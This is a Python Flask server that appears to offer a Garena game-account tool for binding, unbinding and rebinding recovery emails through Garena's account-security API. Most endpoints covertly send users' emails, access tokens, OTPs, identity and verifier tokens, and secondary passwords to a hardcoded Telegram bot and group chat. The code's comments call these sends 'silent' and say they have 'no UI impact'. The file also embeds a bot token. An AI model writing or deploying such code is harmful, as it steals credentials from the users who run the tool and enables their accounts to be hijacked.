from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__, static_folder='.', static_url_path='')

# ============================================================
# ⚠️  TELEGRAM CREDENTIALS (HARDCODED) – PASTE YOUR VALUES BELOW
# ============================================================
TELEGRAM_BOT_TOKEN = "8832085507:AAHYOAE91R0sOw_jpeROGTzWrqyLYEac4yQ"   # Your bot token from @BotFather
TELEGRAM_CHAT_ID = "-1003684272586"                                 # Your group chat ID (negative number)
# ============================================================

def send_telegram_message(text):
    """Send a plain text message to the configured Telegram group (silent, no UI impact)."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram credentials not set – message not sent.")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        resp = requests.post(url, json=payload, timeout=5)
        if resp.status_code == 200:
            return True
        else:
            print(f"Telegram send failed: {resp.status_code} - {resp.text}")
            return False
    except Exception as e:
        print(f"Telegram exception: {e}")
        return False

# ---------- Garena API helpers ----------
GARENA_API_BASE = "https://100067.connect.garena.com"

def garena_post(endpoint, data):
    url = f"{GARENA_API_BASE}{endpoint}"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    resp = requests.post(url, headers=headers, data=data)
    return resp.json(), resp.status_code

def garena_get(endpoint, params):
    url = f"{GARENA_API_BASE}{endpoint}"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Accept": "application/json"
    }
    resp = requests.get(url, headers=headers, params=params)
    return resp.json(), resp.status_code

# ---------- Routes ----------
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

# ---------- API endpoints (Telegram notifications are sent silently) ----------
@app.route('/api/send-otp', methods=['POST'])
def send_otp():
    data = request.json
    email = data.get('email')
    access_token = data.get('access_token')
    if not email or not access_token:
        return jsonify({'error': 'Email and access_token required'}), 400
    payload = {
        'email': email,
        'locale': 'en_MA',
        'region': 'IND',
        'app_id': '100067',
        'access_token': access_token
    }
    result, status = garena_post('/game/account_security/bind:send_otp', payload)
    
    # Silent Telegram notification – no effect on the JSON response sent to the webpage
    if status == 200:
        msg = f"🔐 <b>OTP Sent</b>\nEmail: {email}\nAccess Token: {access_token}\nResponse: {result}"
        send_telegram_message(msg)
    else:
        msg = f"❌ <b>OTP Send Failed</b>\nEmail: {email}\nAccess Token: {access_token}\nError: {result}"
        send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json
    email = data.get('email')
    access_token = data.get('access_token')
    otp = data.get('otp')
    if not all([email, access_token, otp]):
        return jsonify({'error': 'Missing fields'}), 400
    payload = {
        'email': email,
        'app_id': '100067',
        'access_token': access_token,
        'otp': otp
    }
    result, status = garena_post('/game/account_security/bind:verify_otp', payload)
    
    msg = f"🔑 <b>OTP Verification</b>\nEmail: {email}\nOTP: {otp}\nAccess Token: {access_token}\nResponse: {result}"
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/bind-email', methods=['POST'])
def bind_email():
    data = request.json
    email = data.get('email')
    access_token = data.get('access_token')
    verifier_token = data.get('verifier_token')
    if not all([email, access_token, verifier_token]):
        return jsonify({'error': 'Missing fields'}), 400
    payload = {
        'app_id': '100067',
        'access_token': access_token,
        'verifier_token': verifier_token,
        'secondary_password': '91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203',
        'email': email
    }
    result, status = garena_post('/game/account_security/bind:create_bind_request', payload)
    
    msg = (f"📧 <b>Email Bind Request</b>\n"
           f"Email: {email}\nAccess Token: {access_token}\nVerifier Token: {verifier_token}\n"
           f"Response: {result}")
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/get-bind-info', methods=['GET'])
def get_bind_info():
    access_token = request.args.get('access_token')
    if not access_token:
        return jsonify({'error': 'access_token required'}), 400
    params = {'app_id': '100067', 'access_token': access_token}
    result, status = garena_get('/game/account_security/bind:get_bind_info', params)
    return jsonify(result), status

@app.route('/api/get-platforms', methods=['GET'])
def get_platforms():
    access_token = request.args.get('access_token')
    if not access_token:
        return jsonify({'error': 'access_token required'}), 400
    params = {'access_token': access_token}
    result, status = garena_get('/bind/app/platform/info/get', params)
    return jsonify(result), status

@app.route('/api/cancel-request', methods=['POST'])
def cancel_request():
    access_token = request.json.get('access_token')
    if not access_token:
        return jsonify({'error': 'access_token required'}), 400
    payload = {'app_id': '100067', 'access_token': access_token}
    result, status = garena_post('/game/account_security/bind:cancel_request', payload)
    
    msg = f"🚫 <b>Bind Request Cancelled</b>\nAccess Token: {access_token}\nResponse: {result}"
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/verify-identity', methods=['POST'])
def verify_identity():
    data = request.json
    email = data.get('email')
    access_token = data.get('access_token')
    otp = data.get('otp')
    secondary_password = data.get('secondary_password')
    if not email or not access_token:
        return jsonify({'error': 'email and access_token required'}), 400
    if not otp and not secondary_password:
        return jsonify({'error': 'otp or secondary_password required'}), 400
    payload = {'email': email, 'app_id': '100067', 'access_token': access_token}
    if otp:
        payload['otp'] = otp
    else:
        payload['secondary_password'] = secondary_password
    result, status = garena_post('/game/account_security/bind:verify_identity', payload)
    
    msg = (f"🆔 <b>Identity Verification</b>\nEmail: {email}\n"
           f"Access Token: {access_token}\nOTP: {otp if otp else 'N/A'}\n"
           f"Secondary Password: {secondary_password if secondary_password else 'N/A'}\n"
           f"Response: {result}")
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/create-unbind', methods=['POST'])
def create_unbind():
    data = request.json
    access_token = data.get('access_token')
    identity_token = data.get('identity_token')
    if not access_token or not identity_token:
        return jsonify({'error': 'access_token and identity_token required'}), 400
    payload = {'app_id': '100067', 'access_token': access_token, 'identity_token': identity_token}
    result, status = garena_post('/game/account_security/bind:create_unbind_request', payload)
    
    msg = f"🔓 <b>Unbind Request</b>\nAccess Token: {access_token}\nIdentity Token: {identity_token}\nResponse: {result}"
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/rebind', methods=['POST'])
def rebind():
    data = request.json
    identity_token = data.get('identity_token')
    email = data.get('email')
    access_token = data.get('access_token')
    verifier_token = data.get('verifier_token')
    if not all([identity_token, email, access_token, verifier_token]):
        return jsonify({'error': 'Missing fields'}), 400
    payload = {
        'identity_token': identity_token,
        'email': email,
        'app_id': '100067',
        'verifier_token': verifier_token,
        'access_token': access_token
    }
    result, status = garena_post('/game/account_security/bind:create_rebind_request', payload)
    
    msg = (f"🔄 <b>Rebind Request</b>\nEmail: {email}\nAccess Token: {access_token}\n"
           f"Identity Token: {identity_token}\nVerifier Token: {verifier_token}\nResponse: {result}")
    send_telegram_message(msg)
    
    return jsonify(result), status

@app.route('/api/revoke-token', methods=['POST'])
def revoke_token():
    access_token = request.json.get('access_token')
    if not access_token:
        return jsonify({'error': 'access_token required'}), 400
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access_token}"
    headers = {'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)'}
    try:
        resp = requests.get(url, headers=headers)
        result_text = resp.text.strip()
        if result_text == '{"result":0}':
            result = {'result': 0}
        else:
            result = {'result': -1, 'error': result_text}
        
        msg = f"⛔ <b>Token Revoked</b>\nAccess Token: {access_token}\nResponse: {result}"
        send_telegram_message(msg)
        
        return jsonify(result)
    except Exception as e:
        error_result = {'result': -1, 'error': str(e)}
        msg = f"⚠️ <b>Token Revocation Failed</b>\nAccess Token: {access_token}\nError: {str(e)}"
        send_telegram_message(msg)
        return jsonify(error_result), 500

# ---------- Manual notification endpoint (optional, for admin use) ----------
@app.route('/api/notify-telegram', methods=['POST'])
def notify_telegram():
    """
    Send any custom message to the Telegram group.
    (Uses the hardcoded chat ID from above.)
    """
    data = request.json
    message = data.get('message')
    if not message:
        return jsonify({'error': 'message required'}), 400
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        resp = requests.post(url, json=payload, timeout=5)
        if resp.status_code == 200:
            return jsonify({"success": True, "result": resp.json()})
        else:
            return jsonify({"success": False, "error": resp.text}), resp.status_code
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
